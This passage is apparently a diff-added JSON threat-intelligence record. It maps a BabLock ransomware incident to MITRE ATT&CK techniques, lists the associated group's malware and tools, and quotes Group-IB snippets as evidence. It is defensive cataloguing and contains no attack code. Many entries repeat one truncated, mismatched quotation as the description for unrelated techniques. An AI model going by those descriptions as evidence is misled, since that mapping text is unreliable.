+      "description": "“The correct numeric value must be specified as CODE. | | | T1070.001 Indicator Removal on Host: Clear Windows Event Logs | The ransomware uses wevtutil to clear Windows event logs (Application, Security, System, PowerShell) on compromised hosts. | | | T1112 Modify Registry |…” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0006",
+          "name": "Credential Access",
+          "order": 8,
+          "shortname": "credential-access",
+          "url": "https://attack.mitre.org/tactics/TA0006"
+        }
+      ],
+      "technique": {
+        "id": "T1003",
+        "name": "OS Credential Dumping",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1003"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "high",
+      "description": "“The correct numeric value must be specified as CODE. | | | T1070.001 Indicator Removal on Host: Clear Windows Event Logs | The ransomware uses wevtutil to clear Windows event logs (Application, Security, System, PowerShell) on compromised hosts. | | | T1112 Modify Registry |…” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0006",
+          "name": "Credential Access",
+          "order": 8,
+          "shortname": "credential-access",
+          "url": "https://attack.mitre.org/tactics/TA0006"
+        }
+      ],
+      "technique": {
+        "id": "T1110",
+        "name": "Brute Force",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1110"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "high",
+      "description": "“The correct numeric value must be specified as CODE. | | | T1070.001 Indicator Removal on Host: Clear Windows Event Logs | The ransomware uses wevtutil to clear Windows event logs (Application, Security, System, PowerShell) on compromised hosts. | | | T1112 Modify Registry |…” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0007",
+          "name": "Discovery",
+          "order": 9,
+          "shortname": "discovery",
+          "url": "https://attack.mitre.org/tactics/TA0007"
+        }
+      ],
+      "technique": {
+        "id": "T1007",
+        "name": "System Service Discovery",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1007"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "high",
+      "description": "“The correct numeric value must be specified as CODE. | | | T1070.001 Indicator Removal on Host: Clear Windows Event Logs | The ransomware uses wevtutil to clear Windows event logs (Application, Security, System, PowerShell) on compromised hosts. | | | T1112 Modify Registry |…” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0007",
+          "name": "Discovery",
+          "order": 9,
+          "shortname": "discovery",
+          "url": "https://attack.mitre.org/tactics/TA0007"
+        }
+      ],
+      "technique": {
+        "id": "T1018",
+        "name": "Remote System Discovery",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1018"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "low",
+      "description": "“Chinese APT groups have always been considered the creators and active users of this technique.” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0007",
+          "name": "Discovery",
+          "order": 9,
+          "shortname": "discovery",
+          "url": "https://attack.mitre.org/tactics/TA0007"
+        }
+      ],
+      "technique": {
+        "id": "T1033",
+        "name": "System Owner/User Discovery",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1033"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "high",
+      "description": "“The correct numeric value must be specified as CODE. | | | T1070.001 Indicator Removal on Host: Clear Windows Event Logs | The ransomware uses wevtutil to clear Windows event logs (Application, Security, System, PowerShell) on compromised hosts. | | | T1112 Modify Registry |…” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0007",
+          "name": "Discovery",
+          "order": 9,
+          "shortname": "discovery",
+          "url": "https://attack.mitre.org/tactics/TA0007"
+        }
+      ],
+      "technique": {
+        "id": "T1057",
+        "name": "Process Discovery",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1057"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "low",
+      "description": "“Verifying that different passwords are used for local administrators on all the hosts in the infrastructure.” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0007",
+          "name": "Discovery",
+          "order": 9,
+          "shortname": "discovery",
+          "url": "https://attack.mitre.org/tactics/TA0007"
+        }
+      ],
+      "technique": {
+        "id": "T1069.001",
+        "name": "Permission Groups Discovery: Local Groups",
+        "parent_id": "T1069",
+        "url": "https://attack.mitre.org/techniques/T1069/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "high",
+      "description": "“The correct numeric value must be specified as CODE. | | | T1070.001 Indicator Removal on Host: Clear Windows Event Logs | The ransomware uses wevtutil to clear Windows event logs (Application, Security, System, PowerShell) on compromised hosts. | | | T1112 Modify Registry |…” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0007",
+          "name": "Discovery",
+          "order": 9,
+          "shortname": "discovery",
+          "url": "https://attack.mitre.org/tactics/TA0007"
+        }
+      ],
+      "technique": {
+        "id": "T1083",
+        "name": "File and Directory Discovery",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1083"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "low",
+      "description": "“To search for network resources, the ransomware also enumerates Active Directory computers using LDAP queries.” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0007",
+          "name": "Discovery",
+          "order": 9,
+          "shortname": "discovery",
+          "url": "https://attack.mitre.org/tactics/TA0007"
+        }
+      ],
+      "technique": {
+        "id": "T1087.003",
+        "name": "Account Discovery: Email Account",
+        "parent_id": "T1087",
+        "url": "https://attack.mitre.org/techniques/T1087/003"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "high",
+      "description": "“The correct numeric value must be specified as CODE. | | | T1070.001 Indicator Removal on Host: Clear Windows Event Logs | The ransomware uses wevtutil to clear Windows event logs (Application, Security, System, PowerShell) on compromised hosts. | | | T1112 Modify Registry |…” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0007",
+          "name": "Discovery",
+          "order": 9,
+          "shortname": "discovery",
+          "url": "https://attack.mitre.org/tactics/TA0007"
+        }
+      ],
+      "technique": {
+        "id": "T1135",
+        "name": "Network Share Discovery",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1135"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "low",
+      "description": "“Before encryption, the ransomware mounts hidden volumes.” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0007",
+          "name": "Discovery",
+          "order": 9,
+          "shortname": "discovery",
+          "url": "https://attack.mitre.org/tactics/TA0007"
+        }
+      ],
+      "technique": {
+        "id": "T1680",
+        "name": "Local Storage Discovery",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1680"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "high",
+      "description": "“The correct numeric value must be specified as CODE. | | | T1070.001 Indicator Removal on Host: Clear Windows Event Logs | The ransomware uses wevtutil to clear Windows event logs (Application, Security, System, PowerShell) on compromised hosts. | | | T1112 Modify Registry |…” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0008",
+          "name": "Lateral Movement",
+          "order": 10,
+          "shortname": "lateral-movement",
+          "url": "https://attack.mitre.org/tactics/TA0008"
+        }
+      ],
+      "technique": {
+        "id": "T1021.001",
+        "name": "Remote Services: Remote Desktop Protocol",
+        "parent_id": "T1021",
+        "url": "https://attack.mitre.org/techniques/T1021/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "high",
+      "description": "“The correct numeric value must be specified as CODE. | | | T1070.001 Indicator Removal on Host: Clear Windows Event Logs | The ransomware uses wevtutil to clear Windows event logs (Application, Security, System, PowerShell) on compromised hosts. | | | T1112 Modify Registry |…” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0008",
+          "name": "Lateral Movement",
+          "order": 10,
+          "shortname": "lateral-movement",
+          "url": "https://attack.mitre.org/tactics/TA0008"
+        }
+      ],
+      "technique": {
+        "id": "T1021.004",
+        "name": "Remote Services: SSH",
+        "parent_id": "T1021",
+        "url": "https://attack.mitre.org/techniques/T1021/004"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "high",
+      "description": "“The correct numeric value must be specified as CODE. | | | T1070.001 Indicator Removal on Host: Clear Windows Event Logs | The ransomware uses wevtutil to clear Windows event logs (Application, Security, System, PowerShell) on compromised hosts. | | | T1112 Modify Registry |…” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0008",
+          "name": "Lateral Movement",
+          "order": 10,
+          "shortname": "lateral-movement",
+          "url": "https://attack.mitre.org/tactics/TA0008"
+        }
+      ],
+      "technique": {
+        "id": "T1570",
+        "name": "Lateral Tool Transfer",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1570"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "high",
+      "description": "“The ransomware for Windows can independently spread across the network using a group policy. | | TA0011 Command and Control | T1071 Application Layer Protocol | Cobalt Strike Beacons, used by the attackers, can use the application layer (HTTP, HTTPS, DNS) to communicate with…” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0011",
+          "name": "Command and Control",
+          "order": 12,
+          "shortname": "command-and-control",
+          "url": "https://attack.mitre.org/tactics/TA0011"
+        }
+      ],
+      "technique": {
+        "id": "T1071",
+        "name": "Application Layer Protocol",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1071"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "high",
+      "description": "“The ransomware for Windows can independently spread across the network using a group policy. | | TA0011 Command and Control | T1071 Application Layer Protocol | Cobalt Strike Beacons, used by the attackers, can use the application layer (HTTP, HTTPS, DNS) to communicate with…” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0011",
+          "name": "Command and Control",
+          "order": 12,
+          "shortname": "command-and-control",
+          "url": "https://attack.mitre.org/tactics/TA0011"
+        }
+      ],
+      "technique": {
+        "id": "T1105",
+        "name": "Ingress Tool Transfer",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1105"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "high",
+      "description": "“The ransomware for Windows can independently spread across the network using a group policy. | | TA0011 Command and Control | T1071 Application Layer Protocol | Cobalt Strike Beacons, used by the attackers, can use the application layer (HTTP, HTTPS, DNS) to communicate with…” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0011",
+          "name": "Command and Control",
+          "order": 12,
+          "shortname": "command-and-control",
+          "url": "https://attack.mitre.org/tactics/TA0011"
+        }
+      ],
+      "technique": {
+        "id": "T1573",
+        "name": "Encrypted Channel",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1573"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "high",
+      "description": "“The ransomware for Windows can independently spread across the network using a group policy. | | TA0011 Command and Control | T1071 Application Layer Protocol | Cobalt Strike Beacons, used by the attackers, can use the application layer (HTTP, HTTPS, DNS) to communicate with…” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0040",
+          "name": "Impact",
+          "order": 14,
+          "shortname": "impact",
+          "url": "https://attack.mitre.org/tactics/TA0040"
+        }
+      ],
+      "technique": {
+        "id": "T1486",
+        "name": "Data Encrypted for Impact",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1486"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "high",
+      "description": "“The ransomware for Windows can independently spread across the network using a group policy. | | TA0011 Command and Control | T1071 Application Layer Protocol | Cobalt Strike Beacons, used by the attackers, can use the application layer (HTTP, HTTPS, DNS) to communicate with…” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0040",
+          "name": "Impact",
+          "order": 14,
+          "shortname": "impact",
+          "url": "https://attack.mitre.org/tactics/TA0040"
+        }
+      ],
+      "technique": {
+        "id": "T1489",
+        "name": "Service Stop",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1489"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "high",
+      "description": "“The ransomware for Windows can independently spread across the network using a group policy. | | TA0011 Command and Control | T1071 Application Layer Protocol | Cobalt Strike Beacons, used by the attackers, can use the application layer (HTTP, HTTPS, DNS) to communicate with…” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0040",
+          "name": "Impact",
+          "order": 14,
+          "shortname": "impact",
+          "url": "https://attack.mitre.org/tactics/TA0040"
+        }
+      ],
+      "technique": {
+        "id": "T1490",
+        "name": "Inhibit System Recovery",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1490"
+      }
+    }
+  ],
+  "schema_version": "1.0",
+  "slug": "ta505",
+  "software": [
+    {
+      "id": "S0552",
+      "name": "AdFind",
+      "type": "tool",
+      "url": "https://attack.mitre.org/software/S0552"
+    },
+    {
+      "id": "S1025",
+      "name": "Amadey",
+      "type": "malware",
+      "url": "https://attack.mitre.org/software/S1025"
+    },
+    {
+      "id": "S0344",
+      "name": "Azorult",
+      "type": "malware",
+      "url": "https://attack.mitre.org/software/S0344"
+    },
+    {
+      "id": "S0521",
+      "name": "BloodHound",
+      "type": "tool",
+      "url": "https://attack.mitre.org/software/S0521"
+    },
+    {
+      "id": "S0611",
+      "name": "Clop",
+      "type": "malware",
+      "url": "https://attack.mitre.org/software/S0611"
+    },
+    {
+      "id": "S0154",
+      "name": "Cobalt Strike",
+      "type": "malware",
+      "url": "https://attack.mitre.org/software/S0154"
+    },
+    {
+      "id": "S0384",
+      "name": "Dridex",
+      "type": "malware",
+      "url": "https://attack.mitre.org/software/S0384"
+    },
+    {
+      "id": "S0381",
+      "name": "FlawedAmmyy",
+      "type": "malware",
+      "url": "https://attack.mitre.org/software/S0381"
+    },
+    {
+      "id": "S0383",
+      "name": "FlawedGrace",
+      "type": "malware",
+      "url": "https://attack.mitre.org/software/S0383"
+    },
+    {
+      "id": "S0460",
+      "name": "Get2",
+      "type": "malware",
+      "url": "https://attack.mitre.org/software/S0460"
+    },
+    {
+      "id": "S0002",
+      "name": "Mimikatz",
+      "type": "tool",
+      "url": "https://attack.mitre.org/software/S0002"
+    },
+    {
+      "id": "S0039",
+      "name": "Net",
+      "type": "tool",
+      "url": "https://attack.mitre.org/software/S0039"
+    },
+    {
+      "id": "S0194",
+      "name": "PowerSploit",
+      "type": "tool",
+      "url": "https://attack.mitre.org/software/S0194"
+    },
+    {
+      "id": "S0461",
+      "name": "SDBbot",
+      "type": "malware",
+      "url": "https://attack.mitre.org/software/S0461"
+    },
+    {
+      "id": "S0382",
+      "name": "ServHelper",
+      "type": "malware",
+      "url": "https://attack.mitre.org/software/S0382"
+    },
+    {
+      "id": "S0266",
+      "name": "TrickBot",
+      "type": "malware",
+      "url": "https://attack.mitre.org/software/S0266"
+    }
+  ],
+  "stix_modified": "2026-07-31T18:48:04.495Z",
+  "tactics_present": [
+    {
+      "id": "TA0043",
+      "name": "Reconnaissance",
+      "order": 0,
+      "shortname": "reconnaissance",
+      "url": "https://attack.mitre.org/tactics/TA0043"
+    },
+    {
+      "id": "TA0042",
+      "name": "Resource Development",
+      "order": 1,
+      "shortname": "resource-development",
+      "url": "https://attack.mitre.org/tactics/TA0042"
+    },
+    {
+      "id": "TA0001",
+      "name": "Initial Access",
+      "order": 2,
+      "shortname": "initial-access",
+      "url": "https://attack.mitre.org/tactics/TA0001"
+    },
+    {
+      "id": "TA0002",
+      "name": "Execution",
+      "order": 3,
+      "shortname": "execution",
+      "url": "https://attack.mitre.org/tactics/TA0002"
+    },
+    {
+      "id": "TA0003",
+      "name": "Persistence",
+      "order": 4,
+      "shortname": "persistence",
+      "url": "https://attack.mitre.org/tactics/TA0003"
+    },
+    {
+      "id": "TA0004",
+      "name": "Privilege Escalation",
+      "order": 5,
+      "shortname": "privilege-escalation",
+      "url": "https://attack.mitre.org/tactics/TA0004"
+    },
+    {
+      "id": "TA0005",
+      "name": "Stealth",
+      "order": 6,
+      "shortname": "stealth",
+      "url": "https://attack.mitre.org/tactics/TA0005"
+    },
+    {
+      "id": "TA0112",
+      "name": "Defense Impairment",
+      "order": 7,
+      "shortname": "defense-impairment",
+      "url": "https://attack.mitre.org/tactics/TA0112"
+    },
+    {
+      "id": "TA0006",
+      "name": "Credential Access",
+      "order": 8,
+      "shortname": "credential-access",
+      "url": "https://attack.mitre.org/tactics/TA0006"
+    },
+    {
+      "id": "TA0007",
+      "name": "Discovery",
+      "order": 9,
+      "shortname": "discovery",
+      "url": "https://attack.mitre.org/tactics/TA0007"
+    },
+    {
+      "id": "TA0008",
+      "name": "Lateral Movement",
+      "order": 10,
+      "shortname": "lateral-movement",
+      "url": "https://attack.mitre.org/tactics/TA0008"
+    },
+    {
+      "id": "TA0011",
+      "name": "Command and Control",
+      "order": 12,
+      "shortname": "command-and-control",
+      "url": "https://attack.mitre.org/tactics/TA0011"
+    },
+    {
+      "id": "TA0040",
+      "name": "Impact",
+      "order": 14,
+      "shortname": "impact",
+      "url": "https://attack.mitre.org/tactics/TA0040"
+    }
+  ]
+}
